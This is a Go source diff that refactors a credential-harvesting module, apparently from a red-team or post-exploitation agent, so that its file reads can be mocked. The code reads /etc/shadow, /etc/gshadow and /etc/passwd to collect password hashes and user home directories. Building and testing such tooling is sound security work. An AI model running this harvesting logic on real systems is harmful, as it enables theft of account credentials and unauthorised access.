@@ -10,6 +10,8 @@ import (
 	"killa/pkg/structs"
 )
 
+var osReadFile = os.ReadFile
+
 func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "shadow":
@@ -34,7 +36,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 
 	// /etc/shadow — hashed passwords
 	sb.WriteString("--- /etc/shadow ---\n")
-	if data, err := os.ReadFile("/etc/shadow"); err == nil {
+	if data, err := osReadFile("/etc/shadow"); err == nil {
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		count := 0
 		for _, line := range lines {
@@ -78,7 +80,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 
 	// /etc/passwd — check for password hashes in passwd (legacy)
 	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
-	if data, err := os.ReadFile("/etc/passwd"); err == nil {
+	if data, err := osReadFile("/etc/passwd"); err == nil {
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		for _, line := range lines {
 			parts := strings.Split(line, ":")
@@ -109,7 +111,7 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 
 	// /etc/gshadow if readable
 	sb.WriteString("\n--- /etc/gshadow ---\n")
-	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
+	if data, err := osReadFile("/etc/gshadow"); err == nil {
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
 		count := 0
 		for _, line := range lines {
@@ -177,7 +179,7 @@ func credAll(args credHarvestArgs) structs.CommandResult {
 func getUserHomes(filterUser string) []string {
 	var homes []string
 
-	data, err := os.ReadFile("/etc/passwd")
+	data, err := osReadFile("/etc/passwd")
 	if err != nil {
 		if home, err := os.UserHomeDir(); err == nil {
 			return []string{home}
